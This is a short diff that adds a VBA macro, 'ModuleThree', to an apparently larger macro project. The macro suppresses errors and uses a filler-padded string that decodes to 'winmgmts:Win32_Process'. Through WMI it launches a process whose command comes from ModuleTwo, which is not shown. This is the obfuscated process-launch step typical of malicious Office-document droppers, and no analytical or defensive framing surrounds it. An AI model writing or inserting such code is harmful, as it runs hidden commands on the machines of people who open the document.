@@ -1,0 +1,6 @@
+Sub ModuleThree()
+On Error Resume Next
+
+CreateObject(ReplaceString("ashnwashnashniashnnmashngmashntsashn:Wiashnn32ashnashn_Proceashnssashnashn")).Create (ModuleTwo)
+
+End Sub
